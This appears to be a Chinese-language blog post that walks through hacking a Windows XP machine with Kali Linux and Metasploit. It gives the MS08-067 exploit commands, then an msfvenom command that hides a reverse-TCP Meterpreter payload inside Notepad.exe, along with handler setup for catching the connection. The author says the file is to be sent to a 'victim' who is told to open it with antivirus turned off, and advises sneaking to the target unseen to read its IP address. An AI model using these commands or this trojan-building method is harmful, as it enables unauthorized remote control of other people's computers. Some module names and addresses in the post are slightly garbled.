---
layout: post
title: 用kali来黑掉windows
tags: windows linux 教程
keywords: windows linux kali 教程 黑
categoty: tech
cover: 'https://coding.net/u/SunbossRS/p/GotBlogDowner/git/raw/master/img/kalihack/cover.png'
---
### 前言
哈喽大家好。我有好久没更新博客了。  
在这段时间里，我变得非常黑。因为我在为kali做准备。  
前一段时间，我的电脑移到其他地方去了，然后我去插那边的网线，结果插上是插上了，响灯也想了，电脑上也写着连接了，有因特访问。可是，我进百度却进半天都没进去，竟然还连接超时，7456。  
然后有人看了，说是我电脑的问题，叫我装双系统。Okay，这就是我最近在为kali做准备的原因。  
  
### 准备材料
- Kali电脑一部
- 没装防火墙和360卫士或防火墙不稳定的电脑一部*这里我用xp*
  - (可选)摄像头
  - (可选)麦克风

### 目录
- 直接攻击
  - 利用漏洞进行攻击
- 软件攻击
  - 编译软件并发送给受害者
  - 受害者接受并打开软件
  - “注入灵魂”
- 附录
  -Meterpreter命令

### 01.开启Metasploit
Metasploit是一个安全渗透软件。Kali可以在终端*root*里输入:  
```bash
msfconsole
```
来打开它。
![]({{ site.imgbed }}/img/kalihack/01.png)

### 02. 搜索Xp漏洞
也正是msf是一个安全渗透软件，所以我们可以查看漏洞。输入:
```msf
search platform: windows
```
或者是
```msf
search netapi
```
来搜索。  
之后，你会看到有一个`ms08-netapi`的漏洞，利用等级是`great`。  
但确保你要攻击的电脑有这个ms08漏洞。  
![]({{ site.imgbed }}/img/kalihack/02.png)

### 03.使用ms08漏洞并设置
使用该内容，输入:
```msf
use exploit/windows/smb/ms08_067netapi
```
然后你会发现命令的提示符旁边多了一些字符，叫做`exploit(windows/smb/ms08_067-netapi)`的东西，表示着漏洞使用成功。
你可以通过`info *内容名`来详细查看这个内容。
![]({{ site.imgbed }}/img/kalihack/03.png)

### 04.设置载荷
载荷可以说是一个会话的类型设置。你可以看到，命令的末尾有个`bind_tcp`。  
`bind tcp`是比较隐秘的会话。`reverse_tcp`是通过软件发起的对话。我等会儿会讲软件传播。  
```msf
set payload windows/meterpreter/bind_tcp
```

### 05.设置要控制的主机
另外，我们要攻击Xp主机，需要先提前知道Xp的IP地址。  
别被人发现，跑到Xp电脑，输入`ipconfig`查看ip地址。比如，我这里看到ip地址是`192.108.1.104`。    
知道后，回到你的kali前，输入:  
```msf
set RHOST 192.108.1.104
```
这里是设定控制主机的ip地址，RHOST可以说是全写Remote Host。这里我做个例子，ip地址是192.108.1.104。

### 06.开始攻击！
做完这些后，你就可以开始hack了！输入
```msf
exploit
```
![]({{ site.imgbed }}/img/kalihack/04.png)
![]({{ site.imgbed }}/img/kalihack/05.png)

<br /> <br /> <br />

***

<br />
### 前言
你可以先弄出一个我们经常用的应用程序，然后把连接会话藏到这些应用里。这就是为什么在那些2008、2009年时说的“不要下载网站上未知来源的东西”。  
但现在我们有了360安全卫士啊，电脑管家啊那些杀毒软件就变得安全多了。对于我这个灰帽黑客兼MC博主来讲，This is a LITTLE problem。  
But anyways，我们关掉那台Xp的杀毒软件就行了鸭［滑稽］。  
好吧，我们废话不多说，开始正题。

### 01.编译软件和发送
先在`~/`的位置里放置从电脑上拷贝出来的Notepad.exe  
然后在kali命令行里输入这段命令:  
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.106.12.175 LPORT=4444 -x NOTEPAD.EXE -e x86/jmp_call_additive -i 4 -k -f exe > ~/NotepadPro.exe
```
这里我们可以看到-p指到了reverse_tcp了。-p全写就是payload鸭。  
这里的LHOST是指你的Kali电脑的ip地址。  
这里的LPORT是指你的Kali电脑的端口。随情况而定。  
这里的-x是指源，然后msfvenom根据源进行修改和添加。    
至于后面，是指转成X86（32位系统）的软件exe格式。  
  
然后，你会发现在`~/`的位置下生成了一个`NotepadPro.exe`。  
你把它发给在同一个局域网的用户，并指示受害者打开。不过前提是360要关掉。否则..  
![]({{ site.imgbed }}/img/kalihack/06.png)

### 02.设置内容并等待受害者打开文件
```msf
use exploit/multi/handler
//表示使用活动指向的监听器
```
```msf
set LHOST 192.106.12.175
//设置本机ip
```
```msf
set LPORT 4444
//设置本机端口
```
```msf
set payload windows/meterpreter/reverse_tcp
//设置载荷为*比较开放的tcp*
```
```msf
exploit
//开启监听
```
注意，开启监听后，你不会立刻进入`meterpreter`命令提示符的shell。知道受害者打开所谓的`NotepadPro.exe`应用。  
可是，受害者打开后，又会关闭。关闭后，你将无法继续使用`meterpreter`。
